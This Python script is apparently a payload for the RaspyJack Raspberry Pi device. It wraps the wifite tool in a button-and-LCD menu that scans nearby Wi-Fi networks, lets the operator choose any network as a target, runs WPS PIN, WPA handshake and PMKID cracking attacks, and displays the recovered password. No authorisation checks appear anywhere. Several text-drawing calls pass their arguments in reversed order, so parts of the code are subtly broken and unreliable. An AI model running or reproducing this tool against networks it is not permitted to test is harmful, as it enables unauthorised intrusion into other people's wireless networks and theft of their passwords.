#!/usr/bin/env python3
"""
RaspyJack Payload: Wifite GUI
=============================
Final version. This payload dynamically loads its button configuration from the
Raspyjack gui_conf.json file to ensure compatibility. It is built using the
definitive architecture from the project's known-working complex payloads.
"""

import os
import sys
import time
import signal
import json
import subprocess
import threading

# This path modification is required for payloads to find Raspyjack libraries.
sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))

# This hardcoded path is used by other working WiFi payloads.
try:
    sys.path.append('/root/Raspyjack/wifi/')
    from wifi.raspyjack_integration import get_available_interfaces
    WIFI_INTEGRATION = True
except ImportError:
    WIFI_INTEGRATION = False

try:
    # Critical import order for hardware stability.
    import RPi.GPIO as GPIO
    import LCD_Config
    import LCD_1in44
    from PIL import Image, ImageDraw, ImageFont
    HARDWARE_AVAILABLE = True
except ImportError as e:
    print(f"FATAL: Hardware libraries not found: {e}", file=sys.stderr)
    sys.exit(1)

# ============================================================================
# --- Global Variables & State Management ---
# ============================================================================

# Hardware objects
PINS = {} # Will be loaded from gui_conf.json
LCD, IMAGE, DRAW, FONT_TITLE, FONT = None, None, None, None, None

# Global state machine
APP_STATE = "menu"
IS_RUNNING = True

# UI and data state
MENU_SELECTION = 0
NETWORKS = []
SCAN_PROCESS, ATTACK_PROCESS = None, None
ATTACK_TARGET, CRACKED_PASSWORD = None, None
STATUS_MSG = "Ready"
TARGET_SCROLL_OFFSET = 0

# Wifite Configuration
CONFIG = {
    "interface": "wlan1mon", "attack_wpa": True, "attack_wps": True,
    "attack_pmkid": True, "power": 50, "channel": None, "clients_only": False
}
class Network:
    def __init__(self, bssid, essid, channel, power, encryption):
        self.bssid, self.essid, self.channel, self.power, self.encryption = bssid, essid if essid else "Hidden", channel, power, encryption

# ============================================================================
# --- Core & Helper Functions ---
# ============================================================================

def cleanup_handler(*_):
    global IS_RUNNING
    IS_RUNNING = False

def load_pin_config():
    """Loads button pin mapping from the main Raspyjack config file."""
    global PINS
    # Path to the config file, relative to the Raspyjack root CWD
    config_file = 'gui_conf.json'
    
    default_pins = {
        "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26, "OK": 13, "SELECT": 13,
        "KEY1": 21, "KEY2": 20, "KEY3": 16
    }

    try:
        with open(config_file, 'r') as f:
            data = json.load(f)
        conf_pins = data.get("PINS", {})
        
        # Map from the config file's format to the one used by payloads
        PINS = {
            "UP": conf_pins.get("KEY_UP_PIN", 6),
            "DOWN": conf_pins.get("KEY_DOWN_PIN", 19),
            "LEFT": conf_pins.get("KEY_LEFT_PIN", 5),
            "RIGHT": conf_pins.get("KEY_RIGHT_PIN", 26),
            "OK": conf_pins.get("KEY_PRESS_PIN", 13),
            "SELECT": conf_pins.get("KEY_PRESS_PIN", 13),
            "KEY1": conf_pins.get("KEY1_PIN", 21),
            "KEY2": conf_pins.get("KEY2_PIN", 20),
            "KEY3": conf_pins.get("KEY3_PIN", 16),
        }
        print("Successfully loaded PINS from gui_conf.json")
    except Exception as e:
        print(f"WARNING: Could not load gui_conf.json: {e}. Using default pins.", file=sys.stderr)
        PINS = default_pins

def get_pressed_button():
    """Checks for the first pressed button and returns its name."""
    for name, pin in PINS.items():
        if GPIO.input(pin) == 0:
            return name
    return None

def get_wifi_interfaces():
    """Intelligently finds the best WiFi interface, preferring external dongles."""
    if WIFI_INTEGRATION:
        try:
            interfaces = get_available_interfaces()
            if not interfaces: return ["wlan0mon"] # Fallback
            # Sort to prefer wlan1/wlan2, then wlan0, then monitor versions
            interfaces.sort(key=lambda x: (not x.startswith('wlan1'), not x.startswith('wlan2'), not x.endswith('mon'), x))
            return interfaces
        except Exception:
            return ["wlan1mon"] # Fallback
    else:
        try:
            all_ifaces = os.listdir('/sys/class/net/')
            return [i for i in all_ifaces if i.startswith(('wlan', 'ath', 'ra'))] or ["wlan0mon"]
        except FileNotFoundError:
            return ["wlan0mon"]

def validate_setup():
    """Checks if wifite is installed and a WiFi interface is available."""
    global STATUS_MSG, CONFIG
    DRAW.rectangle([(0,0),(128,128)], fill="BLACK")
    DRAW.text((10, 40), "Checking tools...", font=FONT_TITLE, fill="WHITE")
    LCD.LCD_ShowImage(IMAGE, 0, 0)
    if subprocess.run(["which", "wifite"], capture_output=True).returncode != 0:
        DRAW.rectangle([(0,0),(128,128)], fill="BLACK")
        DRAW.text((10, 40), "wifite not found!", font=FONT_TITLE, fill="RED")
        LCD.LCD_ShowImage(IMAGE, 0, 0)
        time.sleep(3)
        return False
    
    DRAW.rectangle([(0,0),(128,128)], fill="BLACK")
    DRAW.text((10, 40), "Checking WiFi...", font=FONT_TITLE, fill="WHITE")
    LCD.LCD_ShowImage(IMAGE, 0, 0)
    
    interfaces = get_wifi_interfaces()
    CONFIG['interface'] = interfaces[0] # Select the best one based on the new sort order
    
    DRAW.rectangle([(0,0),(128,128)], fill="BLACK")
    DRAW.text((10, 40), f"Using {CONFIG['interface']}", font=FONT_TITLE, fill="WHITE")
    LCD.LCD_ShowImage(IMAGE, 0, 0)
    time.sleep(2)
    return True

# ============================================================================
# --- Wifite Process Functions (Identical to previous working version) ---
# ============================================================================
def start_scan():
    global STATUS_MSG, NETWORKS, MENU_SELECTION, TARGET_SCROLL_OFFSET, SCAN_PROCESS, APP_STATE
    APP_STATE = "scanning"; STATUS_MSG = "Starting..."; NETWORKS = []; MENU_SELECTION = 0; TARGET_SCROLL_OFFSET = 0
    cmd = ["wifite", "--csv", "-i", CONFIG['interface'], '--power', str(CONFIG['power'])]
    if not CONFIG['attack_wps']: cmd.append('--no-wps')
    if not CONFIG['attack_wpa']: cmd.append('--no-wpa')
    if not CONFIG['attack_pmkid']: cmd.append('--no-pmkid')
    if CONFIG['channel']: cmd.extend(['-c', str(CONFIG['channel'])])
    if CONFIG['clients_only']: cmd.append('--clients-only')
    def scan_worker():
        global SCAN_PROCESS, STATUS_MSG, NETWORKS, APP_STATE
        try:
            SCAN_PROCESS = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1, universal_newlines=True)
            header = False
            for line in iter(SCAN_PROCESS.stdout.readline, ''):
                if not IS_RUNNING or APP_STATE != "scanning": break
                if not header and "BSSID,ESSID" in line: header = True; STATUS_MSG = "Parsing..."; continue
                if header:
                    try:
                        parts = line.strip().split(','); bssid, essid, ch, pwr, enc = parts[0], parts[1], parts[2], parts[3], parts[4]
                        if bssid and not any(n.bssid == bssid for n in NETWORKS):
                            NETWORKS.append(Network(bssid, essid, ch, pwr, enc)); STATUS_MSG = f"Found: {len(NETWORKS)}"
                    except Exception: continue
            SCAN_PROCESS.wait()
            if APP_STATE == "scanning": APP_STATE = "targets"
        except Exception as e: STATUS_MSG = f"Error: {str(e)[:15]}"; time.sleep(2); APP_STATE = "menu"
    threading.Thread(target=scan_worker, daemon=True).start()

def start_attack(network):
    global APP_STATE, ATTACK_TARGET, CRACKED_PASSWORD, STATUS_MSG, ATTACK_PROCESS
    APP_STATE = "attacking"; ATTACK_TARGET = network; CRACKED_PASSWORD = None; STATUS_MSG = "Initializing..."
    cmd = ["wifite", "--bssid", network.bssid, "-i", CONFIG['interface']]
    if not CONFIG['attack_wps']: cmd.append('--no-wps')
    if not CONFIG['attack_wpa']: cmd.append('--no-wpa')
    if not CONFIG['attack_pmkid']: cmd.append('--no-pmkid')
    if CONFIG['clients_only']: cmd.append('--clients-only')
    def attack_worker():
        global ATTACK_PROCESS, STATUS_MSG, CRACKED_PASSWORD, APP_STATE
        try:
            ATTACK_PROCESS = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1, universal_newlines=True)
            for line in iter(ATTACK_PROCESS.stdout.readline, ''):
                if not IS_RUNNING or APP_STATE != "attacking": break
                line_lower = line.lower()
                if "wps pin attack" in line_lower: STATUS_MSG = "WPS PIN Attack..."
                elif "wpa handshake" in line_lower: STATUS_MSG = "WPA Handshake Capture..."
                elif "pmkid attack" in line_lower: STATUS_MSG = "PMKID Attack..."
                elif "cracked" in line_lower:
                    try: CRACKED_PASSWORD = line.split('"')[1]
                    except IndexError: CRACKED_PASSWORD = "See logs"
                    break
                elif "failed" in line_lower: STATUS_MSG = "Attack failed."
            ATTACK_PROCESS.wait()
            if APP_STATE == "attacking": APP_STATE = "results"
        except Exception as e: STATUS_MSG = f"Attack Error: {str(e)[:15]}"; time.sleep(2); APP_STATE = "targets"
    threading.Thread(target=attack_worker, daemon=True).start()

# ============================================================================
# --- Main Application Entry Point ---
# ============================================================================

if __name__ == "__main__":
    signal.signal(signal.SIGINT, cleanup_handler)
    signal.signal(signal.SIGTERM, cleanup_handler)

    try:
        # --- Init Hardware and Config ---
        load_pin_config() # Load pins from JSON first
        GPIO.setmode(GPIO.BCM)
        for pin in PINS.values(): GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
        LCD = LCD_1in44.LCD(); LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
        WIDTH, HEIGHT = 128, 128
        IMAGE = Image.new("RGB", (WIDTH, HEIGHT), "BLACK"); DRAW = ImageDraw.Draw(IMAGE)
        try: FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 14)
        except IOError: FONT_TITLE = ImageFont.load_default()
        FONT = ImageFont.load_default()
        
        if not validate_setup():
            raise SystemExit()

        # --- Main Loop ---
        while IS_RUNNING:
            # 1. Read Input
            pressed_button = get_pressed_button()
            
            # 2. Handle State & Input
            if pressed_button:
                if pressed_button == "KEY3": IS_RUNNING = False; continue
                
                if APP_STATE == "menu":
                    if pressed_button == "SELECT":
                        if MENU_SELECTION == 0: start_scan()
                        elif MENU_SELECTION == 1: APP_STATE = "settings"; MENU_SELECTION = 0
                        elif MENU_SELECTION == 2: IS_RUNNING = False
                    elif pressed_button == "UP": MENU_SELECTION = (MENU_SELECTION - 1) % 3
                    elif pressed_button == "DOWN": MENU_SELECTION = (MENU_SELECTION + 1) % 3
                
                elif APP_STATE == "settings":
                    if pressed_button == "SELECT":
                        if MENU_SELECTION == 0: APP_STATE = "select_interface"; MENU_SELECTION = 0
                        elif MENU_SELECTION == 1: APP_STATE = "select_attack_types"; MENU_SELECTION = 0
                        elif MENU_SELECTION == 2: APP_STATE = "advanced_settings"; MENU_SELECTION = 0
                    elif pressed_button == "UP": MENU_SELECTION = (MENU_SELECTION - 1) % 3
                    elif pressed_button == "DOWN": MENU_SELECTION = (MENU_SELECTION + 1) % 3
                    elif pressed_button == "LEFT": APP_STATE = "menu"; MENU_SELECTION = 0

                elif APP_STATE == "advanced_settings":
                    if pressed_button == "SELECT":
                        if MENU_SELECTION == 0: APP_STATE = "select_power"
                        elif MENU_SELECTION == 1: APP_STATE = "select_channel"
                        elif MENU_SELECTION == 2: CONFIG["clients_only"] = not CONFIG["clients_only"]
                    elif pressed_button == "UP": MENU_SELECTION = (MENU_SELECTION - 1) % 3
                    elif pressed_button == "DOWN": MENU_SELECTION = (MENU_SELECTION + 1) % 3
                    elif pressed_button == "LEFT": APP_STATE = "settings"; MENU_SELECTION = 0

                elif APP_STATE == "select_interface":
                    interfaces = get_wifi_interfaces()
                    if pressed_button == "UP": MENU_SELECTION = (MENU_SELECTION - 1) % len(interfaces)
                    elif pressed_button == "DOWN": MENU_SELECTION = (MENU_SELECTION + 1) % len(interfaces)
                    elif pressed_button == "SELECT": CONFIG["interface"] = interfaces[MENU_SELECTION]; APP_STATE = "settings"; MENU_SELECTION = 0
                    elif pressed_button == "LEFT": APP_STATE = "settings"; MENU_SELECTION = 0

                elif APP_STATE == "select_attack_types":
                    attack_keys = ["attack_wpa", "attack_wps", "attack_pmkid"]
                    if pressed_button == "UP": MENU_SELECTION = (MENU_SELECTION - 1) % len(attack_keys)
                    elif pressed_button == "DOWN": MENU_SELECTION = (MENU_SELECTION + 1) % len(attack_keys)
                    elif pressed_button == "SELECT": CONFIG[attack_keys[MENU_SELECTION]] = not CONFIG[attack_keys[MENU_SELECTION]]
                    elif pressed_button == "LEFT": APP_STATE = "settings"; MENU_SELECTION = 0

                elif APP_STATE == "select_power":
                    if pressed_button == "UP": CONFIG["power"] = min(100, CONFIG["power"] + 5)
                    elif pressed_button == "DOWN": CONFIG["power"] = max(0, CONFIG["power"] - 5)
                    elif pressed_button == "LEFT": APP_STATE = "advanced_settings"

                elif APP_STATE == "select_channel":
                    if pressed_button == "UP":
                        if CONFIG["channel"] is None: CONFIG["channel"] = 1
                        else: CONFIG["channel"] = min(14, CONFIG["channel"] + 1)
                    elif pressed_button == "DOWN":
                        if CONFIG["channel"] is None: CONFIG["channel"] = 14
                        else: CONFIG["channel"] = max(1, CONFIG["channel"] - 1)
                    elif pressed_button == "SELECT": CONFIG["channel"] = None
                    elif pressed_button == "LEFT": APP_STATE = "advanced_settings"

                elif APP_STATE == "scanning":
                    if pressed_button == "LEFT":
                        if SCAN_PROCESS: SCAN_PROCESS.terminate()
                        APP_STATE = "menu"

                elif APP_STATE == "targets":
                    if pressed_button == "UP": MENU_SELECTION = max(0, MENU_SELECTION - 1)
                    elif pressed_button == "DOWN": 
                        if NETWORKS: MENU_SELECTION = min(len(NETWORKS) - 1, MENU_SELECTION + 1)
                    elif pressed_button == "SELECT":
                        if NETWORKS: start_attack(NETWORKS[MENU_SELECTION])
                    elif pressed_button == "LEFT": APP_STATE = "menu"

                elif APP_STATE == "attacking":
                    if pressed_button == "LEFT":
                        if ATTACK_PROCESS: ATTACK_PROCESS.terminate()
                        APP_STATE = "targets"

                elif APP_STATE == "results":
                    if pressed_button: APP_STATE = "menu"

            # 3. Render UI
            DRAW.rectangle([(0,0), (WIDTH,HEIGHT)], fill="BLACK")
            if APP_STATE == "menu":
                DRAW.text((28, 10), "Wifite GUI", font=FONT_TITLE, fill="WHITE")
                DRAW.line([(10, 30), (118, 30)], fill="#333", width=1)
                options = ["Start Scan", "Settings", "Exit"]
                for i, option in enumerate(options):
                    fill = "WHITE"; y_pos = 40 + i * 25
                    if i == MENU_SELECTION: DRAW.rectangle([(5, y_pos - 2), (123, y_pos + 15)], fill="#003366"); fill = "#FFFF00"
                    DRAW.text((20, y_pos), option, font=FONT_TITLE, fill=fill)
            
            elif APP_STATE == "settings":
                DRAW.text((35, 10), "Settings", font=FONT_TITLE, fill="WHITE")
                DRAW.line([(10, 30), (118, 30)], fill="#333", width=1)
                options = ["Interface", "Attack Types", "Advanced"]
                for i, option in enumerate(options):
                    fill = "WHITE"; y_pos = 40 + i * 25
                    if i == MENU_SELECTION: DRAW.rectangle([(5, y_pos - 2), (123, y_pos + 15)], fill="#003366"); fill = "#FFFF00"
                    value = f": {CONFIG['interface']}" if i == 0 else ""
                    DRAW.text(f"{option}{value}", (10, y_pos), font=FONT, fill=fill)
                DRAW.text("LEFT for Back", (20, 110), font=FONT, fill="#888")

            elif APP_STATE == "advanced_settings":
                DRAW.text((10, 10), "Advanced", font=FONT_TITLE, fill="WHITE")
                DRAW.line([(10, 30), (118, 30)], fill="#333", width=1)
                options = ["Power", "Channel", "Clients Only"]
                for i, option in enumerate(options):
                    fill = "WHITE"; y_pos = 40 + i * 25
                    if i == MENU_SELECTION: DRAW.rectangle([(5, y_pos - 2), (123, y_pos + 15)], fill="#003366"); fill = "#FFFF00"
                    if i == 0: value = f": {CONFIG['power']}"
                    elif i == 1: value = f": {CONFIG['channel'] or 'All'}"
                    else: value = f": {'On' if CONFIG['clients_only'] else 'Off'}"
                    DRAW.text(f"{option}{value}", (10, y_pos), font=FONT, fill=fill)
                DRAW.text("LEFT for Back", (20, 110), font=FONT, fill="#888")

            elif APP_STATE == "select_interface":
                DRAW.text((15, 10), "Interface", font=FONT_TITLE, fill="WHITE")
                DRAW.line([(10, 30), (118, 30)], fill="#333", width=1)
                interfaces = get_wifi_interfaces()
                for i, iface in enumerate(interfaces):
                    fill = "WHITE"; y_pos = 40 + i * 25
                    if i == MENU_SELECTION: DRAW.rectangle([(5, y_pos - 2), (123, y_pos + 15)], fill="#003366"); fill = "#FFFF00"
                    DRAW.text(iface, (20, y_pos), font=FONT_TITLE, fill=fill)
                DRAW.text("LEFT for Back", (20, 110), font=FONT, fill="#888")

            elif APP_STATE == "select_attack_types":
                DRAW.text((25, 10), "Attack Types", font=FONT_TITLE, fill="WHITE")
                DRAW.line([(10, 30), (118, 30)], fill="#333", width=1)
                options = {"attack_wpa": "WPA", "attack_wps": "WPS", "attack_pmkid": "PMKID"}
                for i, key in enumerate(options):
                    fill = "WHITE"; y_pos = 40 + i * 25
                    if i == MENU_SELECTION: DRAW.rectangle([(5, y_pos - 2), (123, y_pos + 15)], fill="#003366"); fill = "#FFFF00"
                    status = "[x]" if CONFIG[key] else "[ ]"
                    DRAW.text(f"{status} {options[key]}", (10, y_pos), font=FONT, fill=fill)
                DRAW.text("LEFT for Back", (20, 110), font=FONT, fill="#888")

            elif APP_STATE == "select_power":
                DRAW.text((30, 10), "Set Power", font=FONT_TITLE, fill="WHITE")
                DRAW.line([(10, 30), (118, 30)], fill="#333", width=1)
                DRAW.text(f"{CONFIG['power']}", (50, 50), font=FONT_TITLE, fill="WHITE")
                DRAW.text("Up/Down to change", (10, 80), font=FONT, fill="WHITE")
                DRAW.text("LEFT for Back", (20, 110), font=FONT, fill="#888")

            elif APP_STATE == "select_channel":
                DRAW.text((25, 10), "Set Channel", font=FONT_TITLE, fill="WHITE")
                DRAW.line([(10, 30), (118, 30)], fill="#333", width=1)
                DRAW.text(f"{CONFIG['channel'] or 'All'}", (50, 50), font=FONT_TITLE, fill="WHITE")
                DRAW.text("Up/Down to change", (10, 80), font=FONT, fill="WHITE")
                DRAW.text("Select for 'All'", (20, 95), font=FONT, fill="WHITE")
                DRAW.text("LEFT for Back", (20, 110), font=FONT, fill="#888")

            elif APP_STATE == "scanning":
                DRAW.text((25, 40), "Scanning...", font=FONT_TITLE, fill="WHITE")
                if STATUS_MSG: DRAW.text((10, 60), STATUS_MSG, font=FONT, fill="#00FF00")
                DRAW.text("KEY3=Exit | LEFT=Back", (10, 110), font=FONT, fill="#888")

            elif APP_STATE == "targets":
                DRAW.text((20, 5), "Select Target", font=FONT_TITLE, fill="WHITE"); DRAW.line([(0, 22), (128, 22)], fill="#333", width=1)
                if not NETWORKS: DRAW.text((10, 50), "No networks found.", font=FONT_TITLE, fill="WHITE")
                else:
                    visible_items = 6
                    if MENU_SELECTION < TARGET_SCROLL_OFFSET: TARGET_SCROLL_OFFSET = MENU_SELECTION
                    if MENU_SELECTION >= TARGET_SCROLL_OFFSET + visible_items: TARGET_SCROLL_OFFSET = MENU_SELECTION - visible_items + 1
                    for i in range(TARGET_SCROLL_OFFSET, TARGET_SCROLL_OFFSET + visible_items):
                        if i >= len(NETWORKS): break
                        network = NETWORKS[i]; display_y = 25 + (i - TARGET_SCROLL_OFFSET) * 16; fill = "WHITE"
                        if i == MENU_SELECTION: DRAW.rectangle([(0, display_y - 2), (128, display_y + 13)], fill="#003366"); fill = "#FFFF00"
                        DRAW.text(f"{network.essid[:14]}", (5, display_y), font=FONT, fill=fill)
                        DRAW.text(f"{network.power}dBm", (90, display_y), font=FONT, fill=fill)

            elif APP_STATE == "attacking":
                if ATTACK_TARGET:
                    DRAW.text("Attacking:", (5, 5), font=FONT, fill="WHITE")
                    DRAW.text(ATTACK_TARGET.essid[:18], (5, 20), font=FONT_TITLE, fill="#FF0000"); DRAW.line([(0, 38), (128, 38)], fill="#333", width=1)
                    if STATUS_MSG: DRAW.text(STATUS_MSG, (5, 45), font=FONT, fill="#00FF00")
                DRAW.text("KEY3=Exit | LEFT=Back", (10, 110), font=FONT, fill="#888")

            elif APP_STATE == "results":
                DRAW.text("Result", (40, 10), font=FONT_TITLE, fill="WHITE"); DRAW.line([(10, 30), (118, 30)], fill="#333", width=1)
                if CRACKED_PASSWORD:
                    DRAW.text("Success!", (35, 40), font=FONT_TITLE, fill="#00FF00")
                    DRAW.text("Password:", (5, 60), font=FONT, fill="WHITE")
                    DRAW.text(CRACKED_PASSWORD, (5, 75), font=FONT_TITLE, fill="#00FF00")
                else:
                    DRAW.text("Failed", (40, 40), font=FONT_TITLE, fill="#FF0000")
                    DRAW.text("Could not crack network.", (5, 60), font=FONT, fill="WHITE")
                DRAW.text("Press any key...", (15, 110), font=FONT, fill="#888")

            LCD.LCD_ShowImage(IMAGE, 0, 0)

            # 4. Debounce by waiting for button release
            if pressed_button:
                while get_pressed_button() is not None:
                    time.sleep(0.05)
            else:
                time.sleep(0.05)

    except Exception as e:
        with open("/tmp/wifite_gui_error.log", "w") as f:
            f.write(f"FATAL ERROR: {type(e).__name__}: {e}\n")
            import traceback
            traceback.print_exc(file=f)
    finally:
        print("Cleaning up GPIO...")
        if HARDWARE_AVAILABLE:
            try: LCD.LCD_Clear()
            except: pass
            GPIO.cleanup()